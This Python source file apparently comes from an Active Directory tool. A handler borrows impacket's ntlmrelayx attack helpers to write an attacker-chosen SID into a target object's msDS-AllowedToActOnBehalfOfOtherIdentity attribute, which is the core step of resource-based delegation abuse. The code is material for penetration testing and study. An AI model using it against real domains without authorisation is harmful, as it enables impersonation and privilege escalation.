from code.src.CommandHandlers.CommandHandler import CommandHandler
from code.src.CommandHandlers.LookupBySidBase import LookupBySidBase
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from impacket.examples.ntlmrelayx.attacks.ldapattack import create_empty_sd,create_allow_ace
from code.src.queryformatter import get_set_msds_allowedtoactonbehalfof_operation

class writeMsDSAllowedToActOnBehalfOfOtherIdentityHandler(CommandHandler,LookupBySidBase):
    def handle(self, command, connection, domaincomponents):
        # Ended up borrowing the impacket approach here:
        # https://github.com/fortra/impacket/blob/7e25245e381a54045f5b039de9f7f9050f6c3c3c/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L386C1-L388C1

        print(f"Hello world: {str(type(command))} {command.userwrittentosid}")

        # TODO: Assuming this works on the basis of this DACL, probably would want to do what impacket does
        # and read original first + append, right? 
        writtensd = create_empty_sd()
        writtensd['Dacl'].aces.append(create_allow_ace(command.valuesid))

        #stringsidwritten = f"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{command.valuesid})"
        # sidwritten = SR_SECURITY_DESCRIPTOR()
        # sidwritten.fromString(stringsidwritten)
        # print(f"Attempting to format sid using impacket: {stringsidwritten}")

        dn = super().translate_sid_to_dc(connection, domaincomponents, command.userwrittentosid)

        # Modify msDs-AllowedToActOnBehalfOf...
        updateAllowedToActCommand = get_set_msds_allowedtoactonbehalfof_operation(writtensd.getData())
        connection.modify(dn,updateAllowedToActCommand)

        print(f"Updated msDS-AllowedToActOnBehalfOfOtherIdentity successfully for {dn}")




